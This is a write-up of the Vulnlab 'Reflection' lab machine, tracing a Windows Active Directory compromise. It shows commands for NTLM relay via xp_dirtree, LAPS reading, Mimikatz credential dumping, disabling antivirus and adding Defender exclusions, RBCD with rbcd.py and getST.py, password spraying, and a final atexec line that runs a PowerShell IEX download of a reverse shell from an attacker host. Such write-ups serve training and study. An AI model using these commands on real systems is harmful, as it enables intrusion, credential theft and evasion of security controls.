---
cover: https://photos.squarezero.dev/file/abir-images/Reflection/logo.png
date: 2024-08-12 09:45:47 +07:00
modified: 2024-08-06 09:45:47 +07:00
categories: [ Writeups, Vulnlab ]
machine_author: 
  name: r0BIT
  link: https://www.linkedin.com/in/robin-unglaub/
tags: [Reflection, Windows, Active Directory, MSSQL, SMB, Bloodhound, Privilege Escalation, LAPS, RBCD, Mimikatz, Secretsdump, Penetration Testing, Medium Difficulty, Enumeration, NTLM Relay, Credential Harvesting, Post-Exploitation]
title: Reflection - Vulnlab
---

![](https://photos.squarezero.dev/file/abir-images/htbasset/vulnbanner.png)

Reflection is a **Medium** difficulty machine where enumeration and exploitation involve a thorough assessment of a Windows-based network. The user started by identifying open ports and services, leading to the discovery of an SMB share containing database credentials. These credentials were used to access MSSQL servers, where additional credentials were retrieved. By exploiting SMB relay vulnerabilities and using Bloodhound for Active Directory enumeration, the user identified privileges like GenericAll that allowed for LAPS password retrieval and a Resource-Based Constrained Delegation (RBCD) attack. Ultimately, the user escalated privileges, retrieved sensitive data using tools like Mimikatz and Secretsdump, and successfully gained administrative access to key systems, culminating in the capture of both user and root flags.

# Enumeration
The Nmap scan shows the following ports.

***WS01.reflection.vl***
```bash
PORT      STATE SERVICE 
53/tcp    open  domain  
88/tcp    open  kerberos-sec 
135/tcp   open  msrpc   
139/tcp   open  netbios-ssn  
389/tcp   open  ldap    
445/tcp   open  microsoft-ds 
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap 
636/tcp   open  ldapssl 
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman   
9389/tcp  open  adws
```

***MS01.reflection.vl***

```bash
PORT      STATE SERVICE 
135/tcp   open  msrpc   
445/tcp   open  microsoft-ds 
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman   
49671/tcp open  unknown
```
***DC01.reflection.vl***
```bash
PORT     STATE SERVICE
135/tcp  open  msrpc  
445/tcp  open  microsoft-ds 
3389/tcp open  ms-wbt-server
7680/tcp open  pando-pub
```

With a null user and any password I can list out the share and inside I found the database config file.

`netexec smb ms01.reflection.vl -u '' -p 'sz' --shares`

`smbclient \\\\\10.10.133.134\\staging -U "" --password='sz'`

![](https://photos.squarezero.dev/file/abir-images/Reflection/1.png)
![](https://photos.squarezero.dev/file/abir-images/Reflection/2.png)

Inside the config file I credential of **web_staging**.

```bash
➜  reflection cat staging_db.conf
user=web_staging
password=<..Redacted..>
db=staging
```

# NTLM Relay

Using the credentials I can log into the MSSQL server on MS01.
`mssqlclient.py 'web_staging'@10.10.133.134`

![](https://photos.squarezero.dev/file/abir-images/Reflection/4.png)

XP_CMDShell cannot be enabled. After enumerating for a while I found the credentials of dev users but they aren't domain-joined users.

```SQL
SQL (web_staging  guest@master)> SELECT name FROM master.dbo.sysdatabases
name 
-------         
master
tempdb
model
msdb
staging
     
SQL (web_staging  guest@master)> use staging      
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: staging           
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'staging'.

SQL (web_staging  dbo@staging)> SELECT table_name FROM staging.INFORMATION_SCHEMA.TABLES            
table_name      
----------      
users
     
SQL (web_staging  dbo@staging)> select * FROM users;                     
id   username   password               
--   --------   -------------          
 1   b'dev01'   b'<..Redacted..>'          
     
 2   b'dev02'   b'<..Redacted..>'
```

As the SMB signing is off I can relay hash to a different machine. For that I have opened **ntlmrelayx** with interactive mode and on MSSQL I used XP_DIRTREE to relay the hash. 
`ntlmrelayx.py --no-http-server -smb2support -tf scope.txt -i`
`exec xp_dirtree '\\10.8.2.110\share'`

![](https://photos.squarezero.dev/file/abir-images/Reflection/5.png)
![](https://photos.squarezero.dev/file/abir-images/Reflection/6.png)

I used Netcat to interact with interactive mode and after enumeration, I found another config file containing credentials for **web_prod**.

![](https://photos.squarezero.dev/file/abir-images/Reflection/7.png)

```bash
➜  reflection cat prod_db.conf                                  
user=web_prod                                                   
password=<..Redacted..> 
```

Using the **web_prod** credential I can now log into the WS01 MSSQL server and after some enumeration, I found more credentials. 

![](https://photos.squarezero.dev/file/abir-images/Reflection/8.png)

```SQL
SQL (web_prod  guest@master)> SELECT name FROM master.dbo.sysdatabases                                                                                                 
name                                                            
------                                                          
master                 
tempdb                 
model                 
msdb                                                     
prod                                                            
                                                                
SQL (web_prod  guest@master)> use prod                          
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: prod     
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'prod'.                                                                                                 

SQL (web_prod  dbo@prod)> SELECT * FROM prod.INFORMATION_SCHEMA.TABLES                                                                                                 
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE          
-------------   ------------   ----------   ----------          
prod            dbo            users        b'BASE TABLE'       
                                                                
SQL (web_prod  dbo@prod)> select * FROM users;                  
id   name              password                                 
--   ---------------   -----------------                        
 1   b'abbie.smith'    b'<..Redacted..>'                        
                                                                
 2   b'dorothy.rose'   b'<..Redacted..>'
```

Both of these credentials are domain-joined and I can them to run **Bloodhound** to enumerate ACLs.
`bloodhound-python -u 'abbie.smith' -p '<..Redacted..>' -ns 10.10.156.53 -│
│d reflection.vl -c all --auth-method auto --zip --dns-tcp`

![](https://photos.squarezero.dev/file/abir-images/Reflection/9.png)
![](https://photos.squarezero.dev/file/abir-images/Reflection/10.png)

# GenericAll (LAPS Password)

In Bloodhound I saw that Abbie has GenericAll right over MS01 & Server OU. Dorothy has regular permissions.

![](https://photos.squarezero.dev/file/abir-images/Reflection/11.png)
![](https://photos.squarezero.dev/file/abir-images/Reflection/12.png)

Bloodhound suggests performing an RBCD attack but I can upon checking Machine Account Quota I saw I can't create any new machine.

`netexec ldap scope.txt -u 'abbie.smith' -p '<..Redacted..>' -M maq`

![](https://photos.squarezero.dev/file/abir-images/Reflection/13.png)
![](https://photos.squarezero.dev/file/abir-images/Reflection/14.png)

If LAPS is enabled I can use Abbie's permission to read LAPS passwords in computers. I used pyLAPS to enumerate LAPS and found the MS01 administrator password.

![](https://photos.squarezero.dev/file/abir-images/Reflection/15.png)
And After logging in I got the user flag.

![](https://photos.squarezero.dev/file/abir-images/Reflection/16.png)

# Resource-Based Constrained Delegation (RBCD)

After getting administrator access I tried to run **Mimikatz** but Antivirus blocked it.

![](https://photos.squarezero.dev/file/abir-images/Reflection/17.png)

I disabled AV and then ran Mimikatz to enumerate vault credentials and found Georgia's domain credential. I have also extracted the MS01 machine hash.

`.\mimikatz.exe "token::elevate" "vault::cred /patch" "exit"`
`.\mimikatz.exe "token::elevate" "lsadump::secrets" "exit"`
![](https://photos.squarezero.dev/file/abir-images/Reflection/18.png)
![](https://photos.squarezero.dev/file/abir-images/Reflection/19.png)

Georgia has GenericAll over MS01 and Bloodhound is suggesting an RBCD attack. As I just compromised a machine and got the machine hash I can perform this attack.

![](https://photos.squarezero.dev/file/abir-images/Reflection/32.png)

To perform this attack first I need to make WS01 trust MS01 using Georgia's right.

`rbcd.py -delegate-from 'MS01$' -delegate-to 'WS01$' -action 'write' 'REFLECTION.VL/Georgia.Price:<..Redacted..>' -dc-ip 10.10.189.69`

![](https://photos.squarezero.dev/file/abir-images/Reflection/20.png)

I have also validated that MS01 can act on behalf of WS01.
`rbcd.py -delegate-to 'WS01$'  -action 'read' 'REFLECTION.VL/Georgia.Price:<..Redacted..>' -dc-ip 10.10.189.69`

![](https://photos.squarezero.dev/file/abir-images/Reflection/21.png)

Now using MS01 I have impersonated the administrator requested a TGT.
`getST.py -spn 'cifs/WS01.REFLECTION.VL' -impersonate 'administrator' 'REFLECTION.VL/MS01$' -hashes :abf3ce6e479dc07cdc441cae4747e3d3 -dc-ip 10.10.189.69`

![](https://photos.squarezero.dev/file/abir-images/Reflection/22.png)

Using the TGT I used serectdumps to dump all credentials stored in WS01 and got password of Rhys Garner.
`RB5CCNAME=administrator.ccache secretsdump.py -k WS01.REFLECTION.VL`

![](https://photos.squarezero.dev/file/abir-images/Reflection/23.png)

# Password Reuse

Rhys has normal user permission. So I decided to use his password to brute-force other users. I used Netexec to extract the usernames of all the users in the domain.

`netexec smb scope.txt -u 'abbie.smith' -p '<..Redacted..>' --users`

![](https://photos.squarezero.dev/file/abir-images/Reflection/29.png)

The password was sprayed using Rhys's password. And dom_rgarner uses the same password.

![](https://photos.squarezero.dev/file/abir-images/Reflection/30.png)

After logging in I got a root flag.

![](https://photos.squarezero.dev/file/abir-images/Reflection/31.png)

# ATEXEC 

I tried to login WS01 using TGT it was giving me an error for some reason.

![](https://photos.squarezero.dev/file/abir-images/Reflection/24.png)

I used ATEXEC which can be used to create and run an immediate scheduled task on a target. 

`atexec.py -hashes :<..Redacted..> administrator@WS01.REFLECTION.VL 'whoami'`

![](https://photos.squarezero.dev/file/abir-images/Reflection/25.png)

I used ATEXEC to add exclusion to temp folder.

`atexec.py -hashes :<..Redacted..> administrator@WS01.REFLECTION.VL 'powershell.exe -c Add-MpPreference -ExclusionPath "C:\Windows\Temp"'`

![](https://photos.squarezero.dev/file/abir-images/Reflection/26.png)

Finally, I used ATEXEC to run reverse-shell.
`atexec.py -hashes :<..Redacted..> administrator@WS01.REFLECTION.VL 'powershell.exe -ep bypass -c "IEX (New-Object System.Net.Webclient).DownloadString("""http://10.8.2.110/shell.ps1""")"'`

![](https://photos.squarezero.dev/file/abir-images/Reflection/27.png)